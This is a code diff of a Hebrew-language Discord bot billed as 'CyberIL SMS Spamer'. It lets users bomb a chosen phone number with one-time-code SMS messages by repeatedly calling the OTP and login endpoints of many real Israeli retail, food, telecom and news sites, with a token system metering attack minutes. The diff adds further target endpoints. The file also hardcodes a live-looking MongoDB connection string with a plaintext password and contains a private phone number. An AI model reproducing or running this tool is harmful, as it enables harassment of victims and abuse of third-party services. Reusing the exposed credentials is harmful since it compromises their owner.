@@ -6,19 +6,18 @@ import requests
 import asyncio
 import random
 from datetime import datetime, timedelta
-from motor.motor_asyncio import AsyncIOMotorClient # ספריה ל-Mongo אסינכרוני
+from motor.motor_asyncio import AsyncIOMotorClient
 
 # --- הגדרות מערכת ---
 TOKEN = os.getenv('DISCORD_TOKEN')
 MONGO_URI = "mongodb+srv://asaf031244_db_user:k57eHWIvYg91mYiJ@cluster0.scy4jgj.mongodb.net/cyberil?appName=Cluster0"
-GSHEET_URL = os.getenv('GSHEET_URL') 
 BLOCKED_NUMBER = "0535524017"
 
 # --- חיבור ל-Database ---
 cluster = AsyncIOMotorClient(MONGO_URI)
 db = cluster["cyberil"]
-users_col = db["users"] # אוסף יתרות ומשתמשים
-logs_col = db["logs"]   # אוסף לוגים של התקפות
+users_col = db["users"]
+logs_col = db["logs"]
 
 active_attacks = {}
 
@@ -30,125 +29,131 @@ USER_AGENTS = [
 class CyberBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.default()
-        intents.message_content = True
         super().__init__(command_prefix="!", intents=intents)
 
     async def setup_hook(self):
         await self.tree.sync()
-        print(f"✅ CyberIL System Connected to MongoDB")
+        print(f"✅ CyberIL Full System Online & Connected to Mongo")
 
 bot = CyberBot()
 
-# --- פונקציות Database ---
-async def get_user_data(user_id):
-    user = await users_col.find_one({"_id": user_id})
+# --- פונקציות עזר DB ---
+async def get_user(uid):
+    user = await users_col.find_one({"_id": uid})
     if not user:
-        user = {"_id": user_id, "tokens": 0, "last_claim": None}
+        user = {"_id": uid, "tokens": 0, "last_claim": None}
         await users_col.insert_one(user)
     return user
 
-async def update_tokens(user_id, amount):
-    await users_col.update_one({"_id": user_id}, {"$inc": {"tokens": amount}}, upsert=True)
-
-# --- מנוע הספאמר ---
+# --- מנוע ה-API המלא (כל האתרים שלך כאן) ---
 def api_call(url, data=None, method="POST", is_json=True):
     try:
         headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*"}
-        if method == "PUT": r = requests.put(url, json=data, headers=headers, timeout=5)
-        elif is_json: r = requests.post(url, json=data, headers=headers, timeout=5)
-        else: r = requests.post(url, data=data, headers=headers, timeout=5)
+        if method == "GET": r = requests.get(url, headers=headers, timeout=5)
+        elif method == "PUT": r = requests.put(url, json=data, headers=headers, timeout=5)
+        else:
+            if is_json: r = requests.post(url, json=data, headers=headers, timeout=5)
+            else: r = requests.post(url, data=data, headers=headers, timeout=5)
         return r.status_code in [200, 201]
     except: return False
 
 async def fire_round(phone):
     tasks = [
+        # סלקום
         asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
+        # MyOfer
         asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
-        asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
-        asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
+        # אתרי Magento (Nine West, Timberland, Fix, Intima, Gali, Aldo)
+        asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
+        asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
+        asyncio.to_thread(api_call, "https://www.fixfixfixfix.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
+        asyncio.to_thread(api_call, "https://www.intima-il.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
+        asyncio.to_thread(api_call, "https://www.gali.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
+        asyncio.to_thread(api_call, "https://www.aldoshoes.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
+        # אוכל (Burgeranch, Papa Johns)
         asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
-        asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"})
+        asyncio.to_thread(api_call, "https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
+        # Globes (הערך המעודכן 154)
+        asyncio.to_thread(api_call, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "154"}, is_json=False),
+        # אתרים נוספים
+        asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
+        asyncio.to_thread(api_call, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
     ]
     results = await asyncio.gather(*tasks)
-    return sum(1 for r in results if r is True)
+    return sum(1 for r in results if r is True), sum(1 for r in results if r is False)
 
 async def run_attack(interaction, phone, minutes):
     uid = interaction.user.id
     active_attacks[uid] = True
-    total_s = 0
+    total_s, total_f = 0, 0
     end_time = datetime.now() + timedelta(minutes=minutes)
     
     await interaction.followup.send(f"🚀 **הפצצה החלה!** יעד: `{phone}`", ephemeral=True)
 
     while datetime.now() < end_time and active_attacks.get(uid):
-        user = await get_user_data(uid)
+        user = await get_user(uid)
         if user["tokens"] <= 0: break
         
-        success = await fire_round(phone)
-        total_s += success
+        s, f = await fire_round(phone)
+        total_s += s
+        total_f += f
         
-        await asyncio.sleep(60)
-        await update_tokens(uid, -1) # הורדת טוקן ב-Mongo
+        await asyncio.sleep(60) # הפחתת טוקן כל דקה
+        await users_col.update_one({"_id": uid}, {"$inc": {"tokens": -1}})
 
-    # שמירת לוג ב-MongoDB
-    log_entry = {
-        "user": interaction.user.name,
-        "target": phone,
-        "duration": minutes,
-        "success": total_s,
-        "date": datetime.now()
-    }
-    await logs_col.insert_one(log_entry)
-
+    await logs_col.insert_one({"user": interaction.user.name, "target": phone, "success": total_s, "date": datetime.now()})
     active_attacks.pop(uid, None)
     await interaction.followup.send(f"🏁 **הסתיים!** יעד: `{phone}` | הצלחות: `{total_s}`", ephemeral=True)
 
-# --- ממשק כפתורים ---
+# --- ממשק כפתורים (עיצוב תמונה) ---
 class CyberView(discord.ui.View):
     def __init__(self): super().__init__(timeout=None)
 
     @discord.ui.button(label="שגר הפצצה", style=discord.ButtonStyle.danger, emoji="🚀")
     async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
-        user = await get_user_data(interaction.user.id)
-        if user["tokens"] < 1:
-            return await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
-            
-        class InputModal(discord.ui.Modal, title="CyberIL - Launcher"):
+        user = await get_user(interaction.user.id)
+        if user["tokens"] < 1: return await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
+        
+        class LaunchModal(discord.ui.Modal, title="CyberIL - Launcher"):
             phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
             mins = discord.ui.TextInput(label="זמן (1-100)", default="5")
             async def on_submit(self, modal_inter: discord.Interaction):
+                if self.phone.value == BLOCKED_NUMBER: return await modal_inter.response.send_message("🚫 חסום!", ephemeral=True)
                 await modal_inter.response.defer(ephemeral=True)
                 asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
-        await interaction.response.send_modal(InputModal())
+        await interaction.response.send_modal(LaunchModal())
 
     @discord.ui.button(label="בדיקת מטבעות", style=discord.ButtonStyle.primary, emoji="💰")
     async def check(self, interaction: discord.Interaction, button: discord.ui.Button):
-        user = await get_user_data(interaction.user.id)
-        await interaction.response.send_message(f"💰 יתרה ב-Database: **{user['tokens']}** דקות.", ephemeral=True)
+        user = await get_user(interaction.user.id)
+        await interaction.response.send_message(f"💰 יתרה: **{user['tokens']}** דקות.", ephemeral=True)
 
     @discord.ui.button(label="טוקן יומי", style=discord.ButtonStyle.success, emoji="🎁")
     async def gift(self, interaction: discord.Interaction, button: discord.ui.Button):
-        user = await get_user_data(interaction.user.id)
+        user = await get_user(interaction.user.id)
         now = datetime.now()
-        
         if not user["last_claim"] or now >= user["last_claim"] + timedelta(hours=24):
             await users_col.update_one({"_id": interaction.user.id}, {"$inc": {"tokens": 5}, "$set": {"last_claim": now}})
-            await interaction.response.send_message("✅ קיבלת 5 טוקנים! נשמר ב-Database.", ephemeral=True)
-        else:
-            await interaction.response.send_message("⏳ כבר לקחת היום.", ephemeral=True)
+            await interaction.response.send_message("✅ קיבלת 5 דקות!", ephemeral=True)
+        else: await interaction.response.send_message("⏳ חזור מחר.", ephemeral=True)
+
+    @discord.ui.button(label="עצור", style=discord.ButtonStyle.secondary, emoji="🛑")
+    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
+        active_attacks[interaction.user.id] = False
+        await interaction.response.send_message("🛑 נעצר.", ephemeral=True)
 
 # --- פקודות ---
 @bot.tree.command(name="spamer-setup", description="לוח בקרה")
 async def setup(interaction: discord.Interaction):
-    user = await get_user_data(interaction.user.id)
+    user = await get_user(interaction.user.id)
     embed = discord.Embed(title="⚡ CyberIL SMS Spamer Control", color=0x2f3136)
-    embed.add_field(name="📊 סטטיסטיקה", value=f"יתרה: `{user['tokens']}` דקות\nDB: `Connected`", inline=False)
+    embed.add_field(name="📊 סטטיסטיקה", value=f"יתרה: `{user['tokens']}` דקות\nסטטוס שרת: `Online`", inline=False)
     embed.set_thumbnail(url="https://emojicdn.elk.sh/🤝")
     await interaction.response.send_message(embed=embed, view=CyberView())
 
 @bot.tree.command(name="spamer-give", description="הענקת טוקנים")
 async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
-    await update_tokens(user.id, amount)
-    await interaction.response.send_message(f"🎁 הוענקו {amount} טוקנים ל-{user.mention} (נשמר ב-Mongo).", ephemeral=True)
+    await users_col.update_one({"_id": user.id}, {"$inc": {"tokens": amount}}, upsert=True)
+    await interaction.response.send_message(f"🎁 הוענקו {amount} דקות ל-{user.mention}.", ephemeral=True)
 
 bot.run(TOKEN)
